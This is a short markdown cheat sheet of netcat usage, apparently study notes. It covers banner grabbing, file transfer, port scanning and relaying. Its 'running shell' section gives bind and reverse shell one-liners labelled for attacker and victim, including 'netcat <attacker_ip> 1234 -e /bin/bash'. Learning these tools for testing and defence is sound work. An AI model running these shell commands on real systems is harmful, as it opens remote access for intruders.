* [Netcat](#netcat)
  * [banner grabbing](#banner-grabbing)
  * [listener](#listener)
  * [transfer file](#transfer-file)
  * [port scanning](#port-scanning)
  * [executing program](#executing-program)
  * [running shell](#running-shell)
  * [relaying](#relaying)

# Netcat
Refs:
* <https://www.youtube.com/watch?v=7YrYRQQLjdA>
* <https://www.poftut.com/netcat-nc-command-tutorial-examples/>
## banner grabbing
```sh
# ssh
netcat 192.251.124.3 22
# SMTP
netcat 192.251.124.3 25

# HTTP
netcat 192.251.124.3 25
GET / HTTP/1.1
```
## listener
```sh
netcat -l -p 6789
```
## transfer file
```sh
# sender
netcat <receiver_ip_addr> 6789 < send_file
# receiver
netcat -l -p 6789 > recv_file
```
## port scanning
```sh
netcat -v -w1 -z <target_ip> <port_range>
```
`-v`  : verbose

`-w1` : wait for 1 sec before timeout

`-z`  : No I/O
## executing program
- The program can be an executable file (EXE, ELF, etc) or a script (shell, ruby, python etc)
- Any I/O is redirected to the established socket
```sh
netcat -e /path/to/executable
```
## running shell
### bind shell
```sh
# attacker
netcat <victim_ip> 1234
# victim
netcat -l -p 1234 -e /bin/bash
```
### reverse shell
```sh
# attacker
netcat -l -p 1234
# victim
netcat <attacker_ip> 1234 -e /bin/bash
```
## relaying
Refs
* <https://www.youtube.com/watch?v=FLoe9S4TASk>
### server client relay
```
   ------                 -------------                 ----- 
  |client|-------------->|server|client|-------------->|server|
   ------                 -------------                 ------
                             Relay                      Target
```
```sh
# on relay
mknod mypipe p
netcat -l -p 6789 < mypipe | netcat <target_ip> 80 > mypipe
```
